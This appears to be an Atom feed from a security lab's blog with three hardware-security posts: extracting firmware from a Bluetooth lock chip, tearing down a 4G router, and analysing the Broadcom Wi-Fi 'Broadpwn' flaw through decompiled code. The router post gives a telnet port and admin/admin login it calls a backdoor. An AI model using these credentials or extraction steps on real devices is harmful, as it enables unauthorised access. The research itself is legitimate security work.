<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>伏宸安全实验室-Future-Sec Information Security Lab</title>
  <subtitle>伏宸安全实验室Future-Sec Information Security Lab</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.future-sec.com/"/>
  <updated>2018-01-19T07:32:47.046Z</updated>
  <id>http://www.future-sec.com/</id>
  
  <author>
    <name>Future-Sec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>芯片安全系列-Let&#39;s cook!</title>
    <link href="http://www.future-sec.com/chip-security-let-us-cook.html"/>
    <id>http://www.future-sec.com/chip-security-let-us-cook.html</id>
    <published>2018-01-20T16:00:00.000Z</published>
    <updated>2018-01-19T07:32:47.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼于上层应用和驱动层面的安全，然而如果芯片存在本质的设计缺陷或安全漏洞，传统安全手段往往很难触及底层，前段时间英特尔芯片的“崩溃”（Meltdown）和“幽灵”（Spectre）漏洞，轰动整个世界，造成了巨额的损失，此次漏洞爆发就是因为芯片自身的设计缺陷所导致的，芯片级的安全研究是一项长期而艰难的工作，其是一门涉及多学科多门类的综合性研究，包括：微电子学、计算机科学、数学、物理学、化学、电磁学、光学等等。芯片分析方式主要包括非侵入式、半侵入式、侵入式、侧信道等。本文通过对某款蓝牙锁芯片的处理和固件提取，作为芯片分析的简单实例。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/dfghfghfhg.jpg" alt="dfghfghfhg"></p>
<h2 id="拆焊"><a href="#拆焊" class="headerlink" title="拆焊"></a>拆焊</h2><p>在PCB背面有一颗CC2541的蓝牙芯片，此款芯片采用QFN-40封装格式，没有暴露的可以直连外部引脚，厂商在量产时也把调试接口去掉了，为了获取芯片的固件内容，需要进行拆焊。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/fghgjty555.jpg" alt="fghgjty555"></p>
<p>拆焊所需工具包括：热风枪、焊枪、松香水、吸锡线、洗板水或无水酒精、无纺布、镊子等。热风枪温度调到360度，风速在5档左右，先在距离PCb上方3到5厘米处，给PCB预热几秒，然后缓缓下移到1厘米处，沿着芯片的四周匀速转动，枪口务必不要对准芯片的中心处，防止芯片过热，造成损毁，大概20秒左右即可融化芯片底部焊锡，另一只手用镊子夹住芯片，轻轻往上一提，芯片即可从PCB取下。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134552.jpg" alt="20180116_134552"><br><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134549.jpg" alt="20180116_134549"></p>
<h2 id="清洁"><a href="#清洁" class="headerlink" title="清洁"></a>清洁</h2><p>取下芯片之后，芯片的底部会粘有很多未去除的焊锡和脏物，需要进一步清洁处理，首先滴上松香水，用焊枪使焊锡融化。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134618.jpg" alt="20180116_134618"></p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134719.jpg" alt="20180116_134719"></p>
<p>然后用吸锡线配合焊枪把多余的焊锡和脏物吸掉，反复几次。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134735.jpg" alt="20180116_134735"></p>
<p>处理完毕之后，用洗板水和无纺布擦洗芯片，彻底去除脏物残留，引脚应保持光亮，以防接触不良和短路。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134815.jpg" alt="20180116_134815"></p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134845.jpg" alt="20180116_134845"></p>
<p>焊锡、松香水和洗板水气味比较刺鼻，高温易伤手，工作环境需要注意通风，有条件可以配置防护服。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28.jpg" alt="breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28"></p>
<h2 id="芯片读取"><a href="#芯片读取" class="headerlink" title="芯片读取"></a>芯片读取</h2><p>CC2541芯片是TI出品的一款蓝牙芯片，TI有专门的工具和软件来读取，包括：CCDebugger调试器和SmartRF Flash Programmer软件，因芯片已经拆下，可以通过转接板或烧录座连接芯片，引出相应的接口，然后连接CCDebugger进行固件的读取。</p>
<p>把处理好的芯片放入烧录座，需要正确放置芯片，可以通过芯片正面的小圆点确定方向。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_134912.jpg" alt="20180116_134912"></p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_135324.jpg" alt="20180116_135324"></p>
<p>确认无误之后，压紧烧录座盖，连上CCDebugger。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116_135403.jpg" alt="20180116_135403"></p>
<p>打开SmartRF Flash Programmer，选择Read flash into hex-file选项，在Flash image选项可以选择保存的路径和文件名，然后点Perform actions，即可开始读取。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116135409.jpg" alt="QQ截图20180116135409"></p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/20180116135434.jpg" alt="QQ截图20180116135434"></p>
<p>读取的文件格式为HEX，然后根据对应的CPU指令编写进行反汇编。   </p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/78B82770-AB46-4404-B195-2B28835DF2AC.jpg" alt="QQ截图20180116135452"></p>
<p>部分芯片另需进行开片和晶体电路修改等等深度处理，本文是伏宸实验室关于芯片安全的一篇先导性文章，后续将会有一系列关于芯片安全的文章，敬请期待。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼
    
    </summary>
    
      <category term="芯片安全" scheme="http://www.future-sec.com/categories/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="芯片安全" scheme="http://www.future-sec.com/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>某4G无线路由终端分析</title>
    <link href="http://www.future-sec.com/analysis-of-a-4G-wireless-router.html"/>
    <id>http://www.future-sec.com/analysis-of-a-4G-wireless-router.html</id>
    <published>2018-01-19T16:00:00.000Z</published>
    <updated>2018-01-19T07:23:47.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设备介绍"><a href="#设备介绍" class="headerlink" title="设备介绍"></a>设备介绍</h2><p>随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，在通过wifi模块将蜂窝网络转为wifi信号共享给其他设备使用，其原理与手机共享热点类似，因其便携省电等功能，目前在市场上的反响颇高，X宝销量达数万件。<br><img src="http://p1aqjecep.bkt.clouddn.com/1224171902.jpg" alt="1224171902"><br><img src="http://p1aqjecep.bkt.clouddn.com/20171219164331.jpg" alt="QQ截图20171219164331"></p>
<h2 id="硬件分析"><a href="#硬件分析" class="headerlink" title="硬件分析"></a>硬件分析</h2><p>话不多说，进入正题，拆掉背面螺丝，取出电池，揭掉正面盖板，在正面PCB上是一块全彩TFT屏幕，显示效果一般，屏幕下方有多个印字。<br><img src="http://p1aqjecep.bkt.clouddn.com/1224171903.jpg" alt="1224171903"></p>
<p>左侧有两个焊点，分别是RXD和TXD口，可以通过UART模式调试。<br><img src="http://p1aqjecep.bkt.clouddn.com/1224171903a.jpg" alt="1224171903a"></p>
<p>下方左侧是8口的JTAG调试口，加一个公用GND口，JTAG调试下篇会重点介绍。<br><img src="http://p1aqjecep.bkt.clouddn.com/1224171903b.jpg" alt="1224171903b"></p>
<p>正下方靠近USB充电口位置是电源电压测试口，主要用来测量额定输入输出的电源电压。<br><img src="http://p1aqjecep.bkt.clouddn.com/1224171903c.jpg" alt="1224171903c"></p>
<p>拆掉PCB上的螺丝，翻转板子，背面包括SIM插槽、SD卡插槽以及核心处理芯片，出于保护和散热的目的，还加装了保护盖。<br><img src="http://p1aqjecep.bkt.clouddn.com/1224171904.jpg" alt="1224171904"></p>
<p>拆掉盖子，先看下主要芯片的型号和用途，这对进一步分析有很大帮助。<br><img src="http://p1aqjecep.bkt.clouddn.com/1224171905-bianhao.jpg" alt="1224171905-bianhao"></p>
<p>图上标注1的芯片通过查看印字分析,为芯天下出产的PN26Q01AWSIUG 型存储芯片，存储容量为1G。<br><img src="http://p1aqjecep.bkt.clouddn.com/20171218_191431.jpg" alt="20171218_191431"></p>
<p>标注2的芯片为中兴微电子生产的ZX297520型手机modem芯片，支持TD-LTE/FDD LTE /WCDMA/TD-SCDMA/EDGE全模制式。<br><img src="http://p1aqjecep.bkt.clouddn.com/20171218_191405.jpg" alt="20171218_191405"></p>
<p>标注3的芯片为Realtek生产的使用非常广泛的RTL8189ES无线wifi芯片，是一款高性能、低功耗、体积小SDIO接口无线模组。<br><img src="http://p1aqjecep.bkt.clouddn.com/20171218_191336.jpg" alt="20171218_191336"></p>
<p>标注4的芯片为中兴微电子生产的ZX23422电源管理芯片。<br><img src="http://p1aqjecep.bkt.clouddn.com/20171218_191524.jpg" alt="20171218_191524"></p>
<p>标注5的芯片为锐迪科（RDA）生产的RPM6743射频前端芯片，是蜂窝网络和wifi信号广播收发的重要组成部分。<br><img src="http://p1aqjecep.bkt.clouddn.com/20171218_191505.jpg" alt="20171218_191505"></p>
<h2 id="串口调试"><a href="#串口调试" class="headerlink" title="串口调试"></a>串口调试</h2><p>在认识设备的基本构成之后，重新组装好，首先通过正面的UART调试串口来进行初步调试，采用夹具连接RXD、TXD两个调试点，在设备通电情况下，只需把转接板上的GND口与板子上的公用GND口相连即可。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/image89.jpg" alt="image89"></p>
<p>因串口输出信息过多，影响观察输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/image90.jpg" alt="image90"></p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/image91.jpg" alt="image91"></p>
<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>查看当前进程，通过串口输出信息，发现该终端采用goahead作为web服务器，4719端口存在一个telnet服务。<br><img src="http://p1aqjecep.bkt.clouddn.com/hgjghjtyut.jpg" alt="命令"></p>
<p>连接wifi进入web管理界面，查看设备ip。<br><img src="http://p1aqjecep.bkt.clouddn.com/15136011800782.jpg" alt="15136011800782"></p>
<p>通过telnet连接设备，使用弱口令弱口令：admin、admin即可登录。<br><img src="http://p1aqjecep.bkt.clouddn.com/15136011175389.jpg" alt="15136011175389"></p>
<p>该账号为后门账号。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/15136012728967.jpg" alt="15136012728967">查看开启的端口。</p>
<p>如果需要继续分析，可以通过tftp 传输文件至本地，例如/bin/goahead。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;设备介绍&quot;&gt;&lt;a href=&quot;#设备介绍&quot; class=&quot;headerlink&quot; title=&quot;设备介绍&quot;&gt;&lt;/a&gt;设备介绍&lt;/h2&gt;&lt;p&gt;随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BROADCOM WI-FI芯片漏洞分析三</title>
    <link href="http://www.future-sec.com/broadcom-wifi-3.html"/>
    <id>http://www.future-sec.com/broadcom-wifi-3.html</id>
    <published>2018-01-18T16:00:00.000Z</published>
    <updated>2018-01-19T07:22:52.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h2><p>从解析wme信标帧开始<br>参考：<a href="http://www.freebuf.com/vuls/142099.html" rel="external nofollow noopener noreferrer" target="_blank">freebuf博客：完整解析博通WiFi芯片Broadpwn漏洞</a><br>先找到固件中的漏洞位置，如下代码所示，有几个关键的数据帧标志类型。根据管理帧的类型在 VMG-1312 的源代码定位到处理这部分管理帧数据包的代码。</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">frame_type = *(unsigned <span class="variable">__int16</span> *)(arg + <span class="number">8</span>);  <span class="comment">// arg-&gt;frame_type</span></div><div class="line">  cfg = *(<span class="variable">_DWORD</span> *)(arg + <span class="number">4</span>);                   <span class="comment">// arg-&gt;bsscfg</span></div><div class="line">  v4 = wlc;</div><div class="line">  ie = *(<span class="variable">_DWORD</span> *)(arg + <span class="number">0</span>xC);                  <span class="comment">// arg-&gt;ie</span></div><div class="line">  current_wmm_ie = *(<span class="variable">_BYTE</span> **)(cfg + <span class="number">0</span>x354);    <span class="comment">// cfg-&gt;current_wmm_ie</span></div><div class="line">  <span class="keyword">if</span> ( frame_type == <span class="number">0</span>x20 )                     <span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    <span class="built_in">goto</span> LABEL_9;</div><div class="line">  <span class="keyword">if</span> ( frame_type &lt;= <span class="number">0</span>x20 )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( *(<span class="variable">_WORD</span> *)(arg + <span class="number">8</span>) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( frame_type != <span class="number">0</span>x10 )                 <span class="comment">// FC_ASSOC_RESP  = 0x10  //关联帧 </span></div><div class="line">        return <span class="number">0</span>;</div><div class="line">      <span class="built_in">goto</span> LABEL_15;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> ( frame_type != <span class="number">0</span>x30 )                     <span class="comment">// FC_REASSOC_RESP = 0x30 重新关联响应帧</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( frame_type == <span class="number">0</span>x80 )                   <span class="comment">// FC_BEACON = 0x80 信标帧</span></div><div class="line">    &#123;</div><div class="line">      v16 = **(<span class="variable">_DWORD</span> **)(*(<span class="variable">_DWORD</span> *)arg + <span class="number">0</span>x1C);</div><div class="line">      <span class="keyword">if</span> ( *(<span class="variable">_DWORD</span> *)(*(<span class="variable">_DWORD</span> *)wlc + <span class="number">0</span>x34) )</div><div class="line">      ...</div><div class="line">      ...</div><div class="line">      ...</div></pre></td></tr></table></figure>
<h2 id="Wlan知识普及"><a href="#Wlan知识普及" class="headerlink" title="Wlan知识普及"></a>Wlan知识普及</h2><p>1）802.11数据包类型</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 数据: 数据数据包的作用是用来携带更高层次的数据(如IP数据包，ISO7层协议)。</div><div class="line">它负责在工作站之间传输数据</div><div class="line"></div><div class="line"><span class="number">2.</span> 管理: 管理数据包控制网络的管理功能</div><div class="line">    <span class="number">1</span>) 信标帧(Beacons): 在无线设备中，定时依次按指定间隔发送的有规律的无线信号(类似心跳包)，主要用于定位和同步使用</div><div class="line">    <span class="number">2</span>) 解除认证(Deauthentication)数据包 </div><div class="line">    <span class="number">3</span>) Probe(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)探测包</div><div class="line">    <span class="number">4</span>) Authenticate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)身份认证</div><div class="line">    <span class="number">5</span>) Associate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)关联</div><div class="line">    <span class="number">6</span>) Reassociate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)重新关联</div><div class="line">    <span class="number">7</span>) Dissassociate(notify) 解除关联</div><div class="line">管理帧负责监督，主要用来加入或退出无线网络，以及处理接入点之间连接的转移事宜</div><div class="line"></div><div class="line"><span class="number">3.</span> 控制: 控制数据包得名于术语<span class="string">"媒体接入控制(Media Access Control, MAC)"</span>，是用来控制对共享媒体(即物理媒介，如光缆)的访问</div><div class="line">    <span class="number">1</span>) 请求发送(<span class="built_in">Request</span> <span class="keyword">To</span> Send，RTS)数据包</div><div class="line">    <span class="number">2</span>) 清除发送(Clear <span class="keyword">To</span> Send，CTS)数据包</div><div class="line">    <span class="number">3</span>) ACK确认(RTS/CTS)  </div><div class="line">    <span class="number">4</span>) PS-Poll: 当一部移动工作站从省电模式中苏醒，便会发送一个 PS-Poll 帧给基站，以取得任何暂存帧 </div><div class="line">控制帧通常与数据帧搭配使用，负责区域的清空、信道的取得以及载波监听的维护，并于收到数据时予以正面的应答，借此促进工作站间数据传输的可靠性</div></pre></td></tr></table></figure>
<h2 id="wifi驱动发送管理帧数据包流程"><a href="#wifi驱动发送管理帧数据包流程" class="headerlink" title="wifi驱动发送管理帧数据包流程"></a>wifi驱动发送管理帧数据包流程</h2><p>总共定位到一处位置：</p>
<p>是在kernel中发送数据包的过程<br>在\VMG1312-B-master\VMG1312-B-master\kernel\linux\drivers\staging\otus\80211core\cmm.c 中的函数 void zfSendMmFrame(zdev_t<em> dev, u8_t frameType, u16_t</em> dst,<br>                   u32_t p1, u32_t p2, u32_t p3)中实现<br>wlan连接过程：<br>    STA (工作站）启动初始化、开始正式使用、AP 传送数据幀之前，要经过三个阶段才能接入:<br>    (1) 扫描(SCAN)<br>    (2) 认证(Authentication)<br>    (3) 关联(Association) </p>
<p>1）探测帧</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_PROBEREQ :<span class="comment">//构造探测帧</span></div><div class="line">            <span class="keyword">offset</span> = zfSendProbeReq(dev, buf, <span class="keyword">offset</span>, (u8_t) p1);<span class="comment">//探测请求</span></div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>2）探测响应帧</p>
<p>构造探测响应帧时有WME参数部分<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">case ZM_WLAN_FRAME_TYPE_PROBERSP : <span class="comment">//探测响应帧</span></div><div class="line">            zm_msg0_mm(ZM_LV_3, <span class="string">"probe rsp"</span>);</div><div class="line">            <span class="comment">/* 24-31 Time Stamp : hardware WON'T fill this field */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">2</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">4</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">6</span>, <span class="number">0</span>);</div><div class="line">            <span class="built_in">offset</span>+=<span class="number">8</span>;</div><div class="line">...</div><div class="line">...</div><div class="line">..</div><div class="line"> <span class="comment">/* WME Parameters */</span></div><div class="line">            <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (wd-&gt;ap.qosMode == <span class="number">1</span>)</div><div class="line">                &#123;</div><div class="line">                    <span class="built_in">offset</span> = zfApAddIeWmePara(dev, buf, <span class="built_in">offset</span>, vap);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ( wd-&gt;wlanMode != ZM_MODE_IBSS )</div><div class="line">            &#123;</div><div class="line">            <span class="comment">// jhlee HT 0</span></div><div class="line">            <span class="comment">//CWYang(+)</span></div><div class="line">                <span class="comment">/* TODO : Need to check if it is ok */</span></div><div class="line">            <span class="comment">/* HT Capabilities Info */</span></div><div class="line">            <span class="built_in">offset</span> = zfMmAddHTCapability(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            <span class="comment">//CWYang(+)</span></div><div class="line">            <span class="comment">/* Extended HT Capabilities Info */</span></div><div class="line">            <span class="built_in">offset</span> = zfMmAddExtendedHTCapability(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ( wd-&gt;sta.ibssAdditionalIESize )</div><div class="line">                <span class="built_in">offset</span> = zfStaAddIbssAdditionalIE(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            break;</div></pre></td></tr></table></figure></p>
<p>3）身份认证</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_AUTH :<span class="comment">//身份认证</span></div><div class="line">            <span class="keyword">if</span> (p1 == <span class="number">0x30001</span>)</div><div class="line">            &#123;</div><div class="line">                hlen += <span class="number">4</span>;</div><div class="line">                <span class="keyword">offset</span> += <span class="number">4</span>;        <span class="comment">// for reserving wep header</span></div><div class="line">                encrypt = <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="comment">/* Algotrithm Number */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p1&amp;<span class="number">0xffff</span>));</div><div class="line">            <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">            <span class="comment">/* Transaction Number */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p1&gt;&gt;<span class="number">16</span>));</div><div class="line">            <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">...</div><div class="line">..</div><div class="line">..</div><div class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (p1 == <span class="number">0x30001</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="comment">/* share-3 : STA return challenge Text */</span></div><div class="line">                zfCopyToIntTxBuffer(dev, buf, wd-&gt;sta.challengeText, <span class="keyword">offset</span>, wd-&gt;sta.challengeText[<span class="number">1</span>]+<span class="number">2</span>);</div><div class="line">                <span class="keyword">offset</span> += (wd-&gt;sta.challengeText[<span class="number">1</span>]+<span class="number">2</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>4）关联请求/重新关联请求<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ASOCREQ :<span class="comment">//关联请求帧</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_REASOCREQ :  <span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    <span class="comment">/* Capability */</span></div><div class="line">    zmw_tx_buf_writeb(dev, buf, <span class="keyword">offset</span>++, wd-&gt;sta.capability[<span class="number">0</span>]);</div><div class="line">    zmw_tx_buf_writeb(dev, buf, <span class="keyword">offset</span>++, wd-&gt;sta.capability[<span class="number">1</span>]);</div><div class="line"></div><div class="line">    <span class="comment">/* Listen Interval */</span>  <span class="comment">//监听间隔</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, <span class="number">0x0005</span>);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Reassocaited Request : Current AP address */</span></div><div class="line">    <span class="keyword">if</span> (frameType == ZM_WLAN_FRAME_TYPE_REASOCREQ)<span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    &#123;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">1</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">2</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    </div><div class="line">    <span class="comment">//Store asoc request frame body, for VISTA only</span></div><div class="line">    wd-&gt;sta.asocReqFrameBodySize = ((<span class="keyword">offset</span> - hlen) &gt;</div><div class="line">            ZM_CACHED_FRAMEBODY_SIZE)?</div><div class="line">            ZM_CACHED_FRAMEBODY_SIZE:(<span class="keyword">offset</span> - hlen);</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;wd-&gt;sta.asocReqFrameBodySize; i++)</div><div class="line">    &#123;</div><div class="line">        wd-&gt;sta.asocReqFrameBody[i] = zmw_tx_buf_readb(dev, buf, i + hlen);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>5）关联响应/重新关联响应</p>
<p>这部分也有WME的相关参数构造<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ASOCRSP :<span class="comment">//关联响应帧</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_REASOCRSP :<span class="comment">// 重新关联响应帧</span></div><div class="line">    vap = (u16_t) p3;</div><div class="line"></div><div class="line">    <span class="comment">/* Capability */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;ap.capab[vap]);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Status Code */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)p1);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* AID */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span 